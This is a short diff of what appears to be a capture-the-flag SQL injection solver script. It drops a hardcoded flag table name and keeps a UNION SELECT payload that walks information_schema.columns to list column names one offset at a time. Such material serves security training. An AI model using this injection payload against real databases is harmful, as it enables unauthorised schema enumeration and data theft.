@@ -23,8 +23,6 @@ for i in range(90):
 i = input("Index: ")
 table = tables[int(i)]
 
-table = "here_is_the_flag"
-
 payload = "252352 UNION SELECT column_name FROM information_schema.columns WHERE table_name = '{:s}' LIMIT 1 OFFSET {:d}"
 
 columns = []
